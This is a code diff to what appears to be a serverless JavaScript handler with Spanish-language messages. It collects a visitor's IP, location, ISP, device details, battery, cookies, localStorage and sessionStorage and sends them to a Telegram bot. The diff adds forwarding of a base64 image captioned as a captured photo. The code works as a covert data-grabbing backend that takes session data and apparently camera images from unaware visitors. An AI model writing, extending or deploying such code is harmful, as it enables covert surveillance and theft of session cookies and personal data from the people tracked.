@@ -33,59 +33,103 @@ exports.handler = async (event) => {
       };
     }
 
-    // Limpiar valores para que no salgan raros
-    const clean = (v) => (v === undefined || v === null || v === "" ? "N/A" : String(v));
+    function clean(v) {
+      if (v === undefined || v === null || v === "") return "N/A";
+      return String(v);
+    }
 
-    const mensaje =
-`474747 - Nueva información
+    const pantalla = clean(data.pantalla);
+    const pixelRatio = clean(data.pixelRatio);
+    const pantallaDisponible = clean(data.pantallaDisponible);
+    const orientacion = clean(data.orientacion);
 
-Red
-• IP: ${clean(data.ip)}
-• País: ${clean(data.country)}
-• Ciudad: ${clean(data.city)}
-• Región: ${clean(data.region)}
-• ISP: ${clean(data.isp)}
-• Conexión: ${clean(data.conexion)}
-• RTT: ${clean(data.rtt)}
+    let mensaje = "474747 - Nueva información\n\n";
+    mensaje += "Red\n";
+    mensaje += "• IP: " + clean(data.ip) + "\n";
+    mensaje += "• País: " + clean(data.country) + "\n";
+    mensaje += "• Ciudad: " + clean(data.city) + "\n";
+    mensaje += "• Región: " + clean(data.region) + "\n";
+    mensaje += "• ISP: " + clean(data.isp) + "\n";
+    mensaje += "• Conexión: " + clean(data.conexion) + "\n";
+    mensaje += "• RTT: " + clean(data.rtt) + "\n\n";
 
-Dispositivo
-• OS: ${clean(data.os)}
-• Navegador: ${clean(data.browser)}
-• Tipo: ${clean(data.device)}
-• RAM: ${clean(data.ram)}
-• Núcleos: ${clean(data.nucleos)}
-• Pantalla: \( {clean(data.pantalla)} ( \){clean(data.pixelRatio)}x)
-• Pantalla disponible: ${clean(data.pantallaDisponible)}
-• Orientación: ${clean(data.orientacion)}
-• Color: ${clean(data.colorDepth)}
+    mensaje += "Dispositivo\n";
+    mensaje += "• OS: " + clean(data.os) + "\n";
+    mensaje += "• Navegador: " + clean(data.browser) + "\n";
+    mensaje += "• Tipo: " + clean(data.device) + "\n";
+    mensaje += "• RAM: " + clean(data.ram) + "\n";
+    mensaje += "• Núcleos: " + clean(data.nucleos) + "\n";
+    mensaje += "• Pantalla: " + pantalla + " (" + pixelRatio + "x)\n";
+    mensaje += "• Pantalla disponible: " + pantallaDisponible + "\n";
+    mensaje += "• Orientación: " + orientacion + "\n";
+    mensaje += "• Color: " + clean(data.colorDepth) + "\n\n";
 
-Batería
-• Nivel: ${clean(data.bateria)}
-• Estado: ${clean(data.cargando)}
+    mensaje += "Batería\n";
+    mensaje += "• Nivel: " + clean(data.bateria) + "\n";
+    mensaje += "• Estado: " + clean(data.cargando) + "\n\n";
 
-Idioma / Zona
-• Idioma: ${clean(data.idioma)}
-• Idiomas: ${clean(data.idiomas)}
-• Zona: ${clean(data.zonaHoraria)}
+    mensaje += "Idioma / Zona\n";
+    mensaje += "• Idioma: " + clean(data.idioma) + "\n";
+    mensaje += "• Idiomas: " + clean(data.idiomas) + "\n";
+    mensaje += "• Zona: " + clean(data.zonaHoraria) + "\n\n";
 
-Almacenamiento y Cookies
-• Cookies habilitadas: ${clean(data.cookiesEnabled)}
-• Cookies: ${clean(data.cookies)}
-• localStorage: ${clean(data.localStorage)}
-• sessionStorage: ${clean(data.sessionStorage)}
+    mensaje += "Almacenamiento y Cookies\n";
+    mensaje += "• Cookies habilitadas: " + clean(data.cookiesEnabled) + "\n";
+    mensaje += "• Cookies: " + clean(data.cookies) + "\n";
+    mensaje += "• localStorage: " + clean(data.localStorage) + "\n";
+    mensaje += "• sessionStorage: " + clean(data.sessionStorage) + "\n\n";
 
-Otras
-• Táctil: ${clean(data.toque)}
-• Touch points: ${clean(data.maxTouchPoints)}
-• Online: ${clean(data.online)}
-• PDF Viewer: ${clean(data.pdfViewer)}
-• Webdriver: ${clean(data.webdriver)}
-• Vendor: ${clean(data.vendor)}
-• Referrer: ${clean(data.referrer)}
+    mensaje += "Otras\n";
+    mensaje += "• Táctil: " + clean(data.toque) + "\n";
+    mensaje += "• Touch points: " + clean(data.maxTouchPoints) + "\n";
+    mensaje += "• Online: " + clean(data.online) + "\n";
+    mensaje += "• PDF Viewer: " + clean(data.pdfViewer) + "\n";
+    mensaje += "• Webdriver: " + clean(data.webdriver) + "\n";
+    mensaje += "• Vendor: " + clean(data.vendor) + "\n";
+    mensaje += "• Referrer: " + clean(data.referrer) + "\n\n";
 
-${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}`;
+    mensaje += new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });
 
-    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    // Si viene una foto en base64, la mandamos también
+    if (data.foto && data.foto.startsWith("data:image")) {
+      // Primero el texto
+      await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
+      });
+
+      // Después la foto
+      const base64Data = data.foto.replace(/^data:image\/\w+;base64,/, "");
+      const photoBuffer = Buffer.from(base64Data, "base64");
+
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("caption", "Foto capturada - 474747");
+      form.append("photo", new Blob([photoBuffer], { type: "image/jpeg" }), "foto.jpg");
+
+      const photoRes = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
+        method: "POST",
+        body: form
+      });
+
+      const photoResult = await photoRes.json();
+      if (!photoRes.ok) {
+        console.error("Error enviando foto:", photoResult);
+      }
+
+      return {
+        statusCode: 200,
+        headers: {
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Origin": "*"
+        },
+        body: JSON.stringify({ success: true, message: "Texto + foto enviados" })
+      };
+    }
+
+    // Solo texto
+    const response = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
